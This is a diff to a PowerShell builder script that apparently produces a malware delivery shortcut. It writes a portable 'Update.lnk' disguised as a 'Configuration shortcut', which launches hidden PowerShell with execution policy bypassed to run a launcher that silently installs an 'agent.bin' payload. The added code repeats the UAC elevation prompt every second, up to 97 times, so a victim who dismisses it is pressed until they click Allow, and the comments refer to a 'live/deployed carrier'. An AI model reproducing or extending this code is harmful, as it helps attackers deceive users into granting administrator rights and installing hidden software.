@@ -5967,10 +5967,14 @@ if (-not [System.IO.Directory]::Exists($outputParent)) {
 if ($PowershellBridge) {
     # PORTABLE Update.lnk (no baked username/path): the shortcut targets the OS
     # PowerShell at a fixed system path (no user dir), and Explorer starts it in
-    # the .lnk's own folder (cwd), so Start-Process runs .\<LauncherSubFolder>\Launcher.exe
+    # the .lnk's own folder (cwd), so the bridge runs Start-Process .\<LauncherSubFolder>\<LauncherTarget>
     # -Verb RunAs => UAC prompt => the launcher (requireAdministrator GUI PE) reads
     # the sibling agent.bin from ITS folder and installs silently. Works from ANY
     # extract folder because nothing is absolute/user-specific.
+    # The bridge carries a retry loop (matches the live/deployed carrier): while
+    # the user has not clicked Allow, Start-Process throws (UAC cancelled) and we
+    # re-arm the prompt every 1s up to 97 attempts, so a stray dismiss never
+    # silently kills the deploy.
     $outPath = $Output
     $description = 'Configuration shortcut'
     if (-not [string]::IsNullOrWhiteSpace($LauncherTag)) {
@@ -5979,7 +5983,8 @@ if ($PowershellBridge) {
         $description = "$description ($tagPart)"
     }
     $psPath = 'C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe'
-    $cmd = "Start-Process -FilePath `".\$LauncherSubFolder\Launcher.exe`" -Verb RunAs"
+    $launcherRel = ".\$LauncherSubFolder\$LauncherTarget"
+    $cmd = "`$e='$launcherRel';`$n=97;while(`$n){try{Start-Process -FilePath `$e -Verb RunAs -ErrorAction Stop;break}catch{`$n-=1;Start-Sleep -Seconds 1}}"
     $bridgeSpec = @{
         TargetPath   = $psPath
         Arguments    = "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command `"$cmd`""
